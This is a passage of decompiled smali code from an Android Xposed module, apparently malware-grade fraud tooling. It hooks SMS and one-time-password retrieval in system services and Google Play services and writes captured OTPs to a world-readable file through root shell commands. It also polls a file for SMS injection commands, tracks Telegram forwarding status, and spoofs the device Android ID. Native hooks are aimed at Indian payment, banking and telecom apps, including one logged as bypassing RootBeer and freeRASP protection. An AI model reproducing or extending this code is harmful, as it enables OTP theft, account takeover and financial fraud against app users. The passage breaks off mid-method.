    aget-object v14, v11, v13

    .line 2566
    .local v14, "s":Ljava/lang/String;
    if-eqz v14, :cond_11

    invoke-virtual {v14, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v15

    if-eqz v15, :cond_11

    .line 2567
    const/4 v0, 0x1

    .line 2568
    goto :goto_d

    .line 2565
    .end local v14    # "s":Ljava/lang/String;
    :cond_11
    add-int/lit8 v13, v13, 0x1

    goto :goto_c

    .line 2558
    :cond_12
    :goto_d
    add-int/lit8 v10, v10, 0x1

    goto :goto_b

    .line 2575
    .end local v10    # "i":I
    :cond_13
    :goto_e
    if-eqz v0, :cond_14

    .line 2576
    new-instance v10, Landroid/database/MatrixCursor;

    new-array v7, v7, [Ljava/lang/String;

    const-string v11, "name"

    aput-object v11, v7, v3

    const/4 v3, 0x1

    aput-object v8, v7, v3

    invoke-direct {v10, v7}, Landroid/database/MatrixCursor;-><init>([Ljava/lang/String;)V

    .line 2578
    .local v10, "mc":Landroid/database/MatrixCursor;
    iget-object v3, v2, Lcom/rebel/module/DeviceFakerManager$DeviceProfile;->androidId:Ljava/lang/String;

    filled-new-array {v9, v3}, [Ljava/lang/Object;

    move-result-object v3

    invoke-virtual {v10, v3}, Landroid/database/MatrixCursor;->addRow([Ljava/lang/Object;)V

    .line 2579
    invoke-virtual {v1, v10}, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->setResult(Ljava/lang/Object;)V

    .line 2580
    invoke-interface {v6}, Landroid/database/Cursor;->close()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 2584
    .end local v0    # "isAndroidId":Z
    .end local v4    # "arg0":Ljava/lang/Object;
    .end local v5    # "uriStr":Ljava/lang/String;
    .end local v6    # "cursor":Landroid/database/Cursor;
    .end local v10    # "mc":Landroid/database/MatrixCursor;
    :cond_14
    goto :goto_10

    .line 2459
    :cond_15
    :goto_f
    return-void

    .line 2583
    :catchall_0
    move-exception v0

    .line 2585
    :goto_10
    return-void

    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method

.method private startInjectMonitor()V
    .locals 7

    .line 1136
    :try_start_0
    invoke-direct {p0}, Lcom/rebel/module/XposedHook;->getInjectCmdFile()Ljava/lang/String;

    move-result-object v0

    .line 1137
    .local v0, "injectPath":Ljava/lang/String;
    new-instance v1, Ljava/io/File;

    invoke-direct {v1, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 1138
    .local v1, "cmdFile":Ljava/io/File;
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    if-nez v2, :cond_0

    .line 1140
    :try_start_1
    invoke-virtual {v1}, Ljava/io/File;->createNewFile()Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 1145
    goto :goto_0

    .line 1141
    :catch_0
    move-exception v2

    .line 1142
    .local v2, "e":Ljava/lang/Exception;
    :try_start_2
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v3

    const/4 v4, 0x3

    new-array v4, v4, [Ljava/lang/String;

    const-string v5, "su"

    const/4 v6, 0x0

    aput-object v5, v4, v6

    const-string v5, "-c"

    const/4 v6, 0x1

    aput-object v5, v4, v6

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "touch "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, " && chmod 666 "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x2

    aput-object v5, v4, v6

    .line 1143
    invoke-virtual {v3, v4}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v3

    .line 1144
    invoke-virtual {v3}, Ljava/lang/Process;->waitFor()I

    .line 1149
    .end local v2    # "e":Ljava/lang/Exception;
    :cond_0
    :goto_0
    new-instance v2, Ljava/lang/Thread;

    new-instance v3, Lcom/rebel/module/XposedHook$$ExternalSyntheticLambda1;

    invoke-direct {v3, p0}, Lcom/rebel/module/XposedHook$$ExternalSyntheticLambda1;-><init>(Lcom/rebel/module/XposedHook;)V

    const-string v4, "SmsInjectPolling"

    invoke-direct {v2, v3, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    .line 1168
    invoke-virtual {v2}, Ljava/lang/Thread;->start()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 1175
    .end local v0    # "injectPath":Ljava/lang/String;
    .end local v1    # "cmdFile":Ljava/io/File;
    goto :goto_1

    .line 1172
    :catch_1
    move-exception v0

    .line 1176
    :goto_1
    return-void
.end method

.method private updateLogTelegramStatus(JLjava/lang/String;)V
    .locals 2
    .param p1, "logId"    # J
    .param p3, "status"    # Ljava/lang/String;

    .line 345
    :try_start_0
    iget-object v0, p0, Lcom/rebel/module/XposedHook;->database:Lcom/rebel/module/SmsLogDatabase;

    if-eqz v0, :cond_0

    const-wide/16 v0, 0x0

    cmp-long v0, p1, v0

    if-lez v0, :cond_0

    .line 346
    iget-object v0, p0, Lcom/rebel/module/XposedHook;->database:Lcom/rebel/module/SmsLogDatabase;

    invoke-virtual {v0, p1, p2, p3}, Lcom/rebel/module/SmsLogDatabase;->updateTelegramStatus(JLjava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 351
    :cond_0
    goto :goto_0

    .line 348
    :catch_0
    move-exception v0

    .line 352
    :goto_0
    return-void
.end method

.method private writeOtpToFile(Ljava/lang/String;)V
    .locals 7
    .param p1, "otp"    # Ljava/lang/String;

    .line 802
    invoke-direct {p0}, Lcom/rebel/module/XposedHook;->getLastOtpFile()Ljava/lang/String;

    move-result-object v0

    .line 804
    .local v0, "otpFile":Ljava/lang/String;
    const/4 v1, 0x1

    const/4 v2, 0x0

    :try_start_0
    new-instance v3, Ljava/io/FileWriter;

    invoke-direct {v3, v0}, Ljava/io/FileWriter;-><init>(Ljava/lang/String;)V

    .line 805
    .local v3, "fw":Ljava/io/FileWriter;
    invoke-virtual {v3, p1}, Ljava/io/FileWriter;->write(Ljava/lang/String;)V

    .line 806
    invoke-virtual {v3}, Ljava/io/FileWriter;->close()V

    .line 807
    new-instance v4, Ljava/io/File;

    invoke-direct {v4, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v1, v2}, Ljava/io/File;->setReadable(ZZ)Z

    .line 808
    new-instance v4, Ljava/io/File;

    invoke-direct {v4, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v1, v2}, Ljava/io/File;->setWritable(ZZ)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 817
    nop

    .end local v3    # "fw":Ljava/io/FileWriter;
    goto :goto_0

    .line 809
    :catch_0
    move-exception v3

    .line 811
    .local v3, "e":Ljava/lang/Exception;
    :try_start_1
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v4

    const/4 v5, 0x3

    new-array v5, v5, [Ljava/lang/String;

    const-string v6, "su"

    aput-object v6, v5, v2

    const-string v2, "-c"

    aput-object v2, v5, v1

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "echo \'"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "\' > "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, " && chmod 666 "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x2

    aput-object v1, v5, v2

    invoke-virtual {v4, v5}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v1

    .line 812
    invoke-virtual {v1}, Ljava/lang/Process;->waitFor()I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 816
    goto :goto_0

    .line 813
    :catch_1
    move-exception v1

    .line 818
    .end local v3    # "e":Ljava/lang/Exception;
    :goto_0
    return-void
.end method


# virtual methods
.method public handleLoadPackage(Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;)V
    .locals 9
    .param p1, "lpparam"    # Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;

    .line 1251
    const-string v0, "isCleartextTrafficPermitted"

    const-string v1, "android.security.NetworkSecurityPolicy"

    iget-object v2, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->packageName:Ljava/lang/String;

    const-string v3, "com.rebel.module"

    invoke-virtual {v3, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 1252
    return-void

    .line 1255
    :cond_0
    :try_start_0
    iget-object v2, p0, Lcom/rebel/module/XposedHook;->context:Landroid/content/Context;

    if-nez v2, :cond_1

    .line 1256
    const-string v2, "android.app.ActivityThread"

    .line 1258
    const/4 v4, 0x0

    invoke-static {v2, v4}, Lde/robv/android/xposed/XposedHelpers;->findClass(Ljava/lang/String;Ljava/lang/ClassLoader;)Ljava/lang/Class;

    move-result-object v2

    const-string v4, "currentActivityThread"

    const/4 v5, 0x0

    new-array v6, v5, [Ljava/lang/Object;

    .line 1257
    invoke-static {v2, v4, v6}, Lde/robv/android/xposed/XposedHelpers;->callStaticMethod(Ljava/lang/Class;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    const-string v4, "getSystemContext"

    new-array v5, v5, [Ljava/lang/Object;

    .line 1256
    invoke-static {v2, v4, v5}, Lde/robv/android/xposed/XposedHelpers;->callMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/content/Context;

    iput-object v2, p0, Lcom/rebel/module/XposedHook;->context:Landroid/content/Context;

    .line 1262
    :cond_1
    new-instance v2, Lcom/rebel/module/ConfigManager;

    invoke-direct {v2}, Lcom/rebel/module/ConfigManager;-><init>()V

    iput-object v2, p0, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    .line 1265
    invoke-direct {p0, p1}, Lcom/rebel/module/XposedHook;->hookSmsSending(Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;)V

    .line 1268
    invoke-direct {p0}, Lcom/rebel/module/XposedHook;->loadNativeSession()V

    .line 1271
    const-string v2, "android"

    iget-object v4, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->packageName:Ljava/lang/String;

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    const/4 v4, 0x1

    if-eqz v2, :cond_2

    .line 1272
    iput-boolean v4, p0, Lcom/rebel/module/XposedHook;->isSystemServer:Z

    .line 1275
    invoke-direct {p0}, Lcom/rebel/module/XposedHook;->startInjectMonitor()V

    .line 1278
    invoke-direct {p0, p1}, Lcom/rebel/module/XposedHook;->hookSmsRetrieval(Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;)V

    .line 1279
    return-void

    .line 1283
    :cond_2
    const-string v2, "com.android.phone"

    iget-object v5, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->packageName:Ljava/lang/String;

    invoke-virtual {v2, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 1292
    const-string v2, "com.google.android.gms"

    iget-object v5, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->packageName:Ljava/lang/String;

    invoke-virtual {v2, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_3

    .line 1295
    invoke-direct {p0, p1}, Lcom/rebel/module/XposedHook;->hookSmsRetrieval(Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;)V

    .line 1296
    invoke-direct {p0, p1}, Lcom/rebel/module/XposedHook;->hookGmsSmsRetrieval(Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;)V

    .line 1297
    invoke-direct {p0, p1}, Lcom/rebel/module/XposedHook;->hookSmsUserConsentApi(Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;)V

    .line 1298
    invoke-direct {p0, p1}, Lcom/rebel/module/XposedHook;->hookCursorSmsReads(Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;)V

    .line 1299
    return-void

    .line 1302
    :cond_3
    iget-object v2, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->packageName:Ljava/lang/String;

    invoke-virtual {v3, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_b

    if-eqz v2, :cond_4

    .line 1304
    :try_start_1
    const-string v0, "com.rebel.module.MainActivity"

    iget-object v1, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    const-string v2, "isModuleActive"

    new-instance v3, Lcom/rebel/module/XposedHook$11;

    invoke-direct {v3, p0}, Lcom/rebel/module/XposedHook$11;-><init>(Lcom/rebel/module/XposedHook;)V

    filled-new-array {v3}, [Ljava/lang/Object;

    move-result-object v3

    invoke-static {v0, v1, v2, v3}, Lde/robv/android/xposed/XposedHelpers;->findAndHookMethod(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/String;[Ljava/lang/Object;)Lde/robv/android/xposed/XC_MethodHook$Unhook;
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 1316
    goto :goto_0

    .line 1313
    :catchall_0
    move-exception v0

    .line 1317
    :goto_0
    return-void

    .line 1344
    :cond_4
    :try_start_2
    const-string v2, "com.naviapp"

    iget-object v3, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->packageName:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_b

    if-eqz v2, :cond_5

    .line 1346
    :try_start_3
    invoke-static {}, Lcom/rebel/module/NativeBridge;->ensureLoaded()Z

    .line 1347
    const-string v2, "navi"

    invoke-static {v2}, Lcom/rebel/module/NativeBridge;->nativeSetPresetDirect(Ljava/lang/String;)V

    .line 1348
    const-string v2, "NaviHook: \u2713 Preset \'navi\' set directly in C++ memory"

    invoke-static {v2}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    .line 1351
    goto :goto_1

    .line 1349
    :catchall_1
    move-exception v2

    .line 1350
    .local v2, "t":Ljava/lang/Throwable;
    :try_start_4
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "NaviHook: \u2717 Failed to set preset: "

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v2}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V

    .line 1495
    .end local v2    # "t":Ljava/lang/Throwable;
    :cond_5
    :goto_1
    const-string v2, "com.nextbillion.groww"

    iget-object v3, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->packageName:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_6

    .line 1496
    iget-object v2, p0, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-static {p1, v2}, Lcom/rebel/module/GrowHook;->install(Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;Lcom/rebel/module/ConfigManager;)V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_b

    .line 1498
    :try_start_5
    invoke-static {}, Lcom/rebel/module/NativeBridge;->ensureLoaded()Z

    .line 1499
    const-string v2, "groww"

    invoke-static {v2}, Lcom/rebel/module/NativeBridge;->nativeSetPresetDirect(Ljava/lang/String;)V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_2

    .line 1501
    goto :goto_2

    .line 1500
    :catchall_2
    move-exception v2

    .line 1508
    :cond_6
    :goto_2
    :try_start_6
    const-string v2, "com.fisglobal.esafupi.app"

    iget-object v3, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->packageName:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_b

    if-eqz v2, :cond_9

    .line 1510
    const/4 v2, 0x0

    .line 1512
    .local v2, "fixEsafEnabled":Z
    :try_start_7
    iget-object v3, p0, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v3}, Lcom/rebel/module/ConfigManager;->isFixEsafEnabled()Z

    move-result v3
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_3

    move v2, v3

    .line 1515
    goto :goto_3

    .line 1513
    :catchall_3
    move-exception v3

    .line 1514
    .local v3, "t":Ljava/lang/Throwable;
    :try_start_8
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "EsafHook: Could not read fix_esaf config: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v3}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V

    .line 1516
    .end local v3    # "t":Ljava/lang/Throwable;
    :goto_3
    if-eqz v2, :cond_7

    .line 1517
    const-string v3, "EsafHook: \u2713 Java Hook ENABLED \u2014 installing lImssC + SecurityAlgo"

    invoke-static {v3}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V

    .line 1518
    iget-object v3, p0, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-static {p1, v3}, Lcom/rebel/module/EsafHook;->install(Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;Lcom/rebel/module/ConfigManager;)V

    goto :goto_4

    .line 1520
    :cond_7
    const-string v3, "EsafHook: \u2717 Java Hook DISABLED"

    invoke-static {v3}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_b

    .line 1524
    :goto_4
    const/4 v3, 0x1

    .line 1526
    .local v3, "fixEsafNativeEnabled":Z
    :try_start_9
    iget-object v5, p0, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v5}, Lcom/rebel/module/ConfigManager;->isFixEsafNativeEnabled()Z

    move-result v5
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_4

    move v3, v5

    .line 1529
    goto :goto_5

    .line 1527
    :catchall_4
    move-exception v5

    .line 1528
    .local v5, "t":Ljava/lang/Throwable;
    :try_start_a
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "EsafHook: Could not read fix_esaf_native config: "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v5}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_a
    .catchall {:try_start_a .. :try_end_a} :catchall_b

    .line 1530
    .end local v5    # "t":Ljava/lang/Throwable;
    :goto_5
    if-eqz v3, :cond_8

    .line 1532
    :try_start_b
    invoke-static {}, Lcom/rebel/module/NativeBridge;->ensureLoaded()Z

    .line 1533
    iget-object v5, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    const-class v6, Lde/robv/android/xposed/XposedHelpers;

    const-class v7, Lde/robv/android/xposed/XposedBridge;

    const-class v8, Lcom/rebel/module/EsafMethodHook;

    invoke-static {v5, v6, v7, v8}, Lcom/rebel/module/NativeBridge;->nativeHookEsaf(Ljava/lang/ClassLoader;Ljava/lang/Class;Ljava/lang/Class;Ljava/lang/Class;)V

    .line 1536
    const-string v5, "EsafHook: \u2713 Native Hook ENABLED \u2014 RootBeer + freeRASP + Token"

    invoke-static {v5}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_b
    .catchall {:try_start_b .. :try_end_b} :catchall_5

    .line 1539
    :goto_6
    goto :goto_7

    .line 1537
    :catchall_5
    move-exception v5

    .line 1538
    .local v5, "th":Ljava/lang/Throwable;
    :try_start_c
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "EsafHook: \u2717 Native hooks failed: "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v5}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V

    .end local v5    # "th":Ljava/lang/Throwable;
    goto :goto_6

    .line 1541
    :cond_8
    const-string v5, "EsafHook: \u2717 Native Hook DISABLED"

    invoke-static {v5}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V

    .line 1548
    .end local v2    # "fixEsafEnabled":Z
    .end local v3    # "fixEsafNativeEnabled":Z
    :cond_9
    :goto_7
    const-string v2, "omnicash.rio.app"

    iget-object v3, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->packageName:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2
    :try_end_c
    .catchall {:try_start_c .. :try_end_c} :catchall_b

    if-eqz v2, :cond_c

    .line 1550
    const/4 v2, 0x0

    .line 1552
    .local v2, "fixZaggEnabled":Z
    :try_start_d
    iget-object v3, p0, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    if-eqz v3, :cond_a

    .line 1553
    iget-object v3, p0, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v3}, Lcom/rebel/module/ConfigManager;->isFixZaggEnabled()Z

    move-result v3
    :try_end_d
    .catchall {:try_start_d .. :try_end_d} :catchall_6

    move v2, v3

    .line 1556
    :cond_a
    goto :goto_8

    .line 1555
    :catchall_6
    move-exception v3

    .line 1558
    :goto_8
    if-eqz v2, :cond_b

    .line 1559
    :try_start_e
    invoke-static {}, Lcom/rebel/module/NativeBridge;->ensureLoaded()Z

    .line 1560
    const-string v3, "zagg"

    invoke-static {v3}, Lcom/rebel/module/NativeBridge;->nativeSetPresetDirect(Ljava/lang/String;)V

    .line 1561
    iget-object v3, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    const-class v5, Lde/robv/android/xposed/XposedHelpers;

    const-class v6, Lcom/rebel/module/ZaggMethodHook;

    invoke-static {v3, v5, v6}, Lcom/rebel/module/NativeBridge;->nativeHookZagg(Ljava/lang/ClassLoader;Ljava/lang/Class;Ljava/lang/Class;)V

    .line 1563
    const-string v3, "ZaggHook: \u2713 Native routing hook attached"

    invoke-static {v3}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_e
    .catchall {:try_start_e .. :try_end_e} :catchall_7

    goto :goto_9

    .line 1565
    .end local v2    # "fixZaggEnabled":Z
    :catchall_7
    move-exception v2

    .line 1566
    .local v2, "t":Ljava/lang/Throwable;
    :try_start_f
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "ZaggHook: \u2717 Native hook failed to attach: "

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v2}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V

    goto :goto_a

    .line 1567
    .end local v2    # "t":Ljava/lang/Throwable;
    :cond_b
    :goto_9
    nop

    .line 1575
    :cond_c
    :goto_a
    const-string v2, "com.myairtelapp"

    iget-object v3, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->packageName:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2
    :try_end_f
    .catchall {:try_start_f .. :try_end_f} :catchall_b

    if-eqz v2, :cond_f

    .line 1576
    const/4 v2, 0x0

    .line 1578
    .local v2, "fixAirtelEnabled":Z
    :try_start_10
    iget-object v3, p0, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    if-eqz v3, :cond_d

    .line 1579
    iget-object v3, p0, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v3}, Lcom/rebel/module/ConfigManager;->isFixAirtelEnabled()Z

    move-result v3
    :try_end_10
    .catchall {:try_start_10 .. :try_end_10} :catchall_8

    move v2, v3

    .line 1582
    :cond_d
    goto :goto_b

    .line 1581
    :catchall_8
    move-exception v3

    .line 1584
    :goto_b
    if-eqz v2, :cond_e

    .line 1586
    :try_start_11
    invoke-static {}, Lcom/rebel/module/NativeBridge;->ensureLoaded()Z

    .line 1587
    const-string v3, "airtel"

    invoke-static {v3}, Lcom/rebel/module/NativeBridge;->nativeSetPresetDirect(Ljava/lang/String;)V

    .line 1588
    iget-object v3, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    const-class v5, Lde/robv/android/xposed/XposedHelpers;

    const-class v6, Lde/robv/android/xposed/XposedBridge;

    const-class v7, Lcom/rebel/module/AirtelMethodHook;

    invoke-static {v3, v5, v6, v7}, Lcom/rebel/module/NativeBridge;->nativeHookAirtel(Ljava/lang/ClassLoader;Ljava/lang/Class;Ljava/lang/Class;Ljava/lang/Class;)V

    .line 1591
